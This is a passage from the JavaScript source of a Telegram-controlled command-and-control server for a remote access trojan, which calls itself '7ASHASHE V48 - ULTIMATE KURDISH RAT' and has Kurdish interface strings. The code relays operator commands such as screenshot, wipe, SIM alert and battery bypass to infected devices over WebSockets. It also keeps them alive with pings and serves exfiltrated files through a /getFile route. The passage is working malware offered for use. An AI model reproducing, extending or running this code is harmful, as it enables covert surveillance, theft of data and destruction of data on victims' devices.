        'smart_screenshot': 'smart_screenshot',
        'flash': 'flash',
        'battery_bypass': 'battery_bypass',
        'sim_alert': 'sim_alert',
        'wipe': 'wipe',
        'toast': 'toast',
        'auto_boot': 'auto_boot'
    };

    for (const [cmd, wsCmd] of Object.entries(commands)) {
        if (commend == cmd) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == uuid) {
                    ws.send(wsCmd);
                }
            });
            appBot.deleteMessage(chatId, msg.message_id);
            appBot.sendMessage(chatId,
                '🔴 **فەرمان نێردرا**\n\n' +
                'چاوەڕێی وەڵام بە...',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"], ["🔴 پێشکەوتوو"], ["🔴 فایلەکان"]],
                        'resize_keyboard': true
                    }
                }
            );
            break;
        }
    }
});

// =====================================================
// 🔄 پینگ و پاراستنی سێرڤەر
// =====================================================
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping');
    });
    try {
        axios.get(address).then(r => "");
    } catch (e) {}
}, 30000);

// =====================================================
// 🚀 دەستپێکردنی سێرڤەر (پۆرت 8080)
// =====================================================
const PORT = process.env.PORT || 8080;
appServer.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ 7ASHASHE V48 running on port ${PORT}`);
    console.log(`🌐 http://localhost:${PORT}`);
    console.log(`🔥 ULTIMATE KURDISH RAT - عەزازیل 7ASHASHE`);
    
    appBot.sendMessage(chatId,
        `🔴 **7ASHASHE V48 - ULTIMATE KURDISH RAT**\n\n` +
        `👑 **عەزازیل 7ASHASHE**\n` +
        `📊 وەشان: 48.0.0\n` +
        `🌐 پۆرت: ${PORT}\n` +
        `📁 فۆڵدەری فایلەکان: /data\n` +
        `🔗 لینکی فایلەکان: /getFile/[ناوی فایل]\n` +
        `⏰ کات: ${new Date().toLocaleString('ckb')}\n\n` +
        `🦁 **عەزازیل 7ASHASHE**`
    );
});
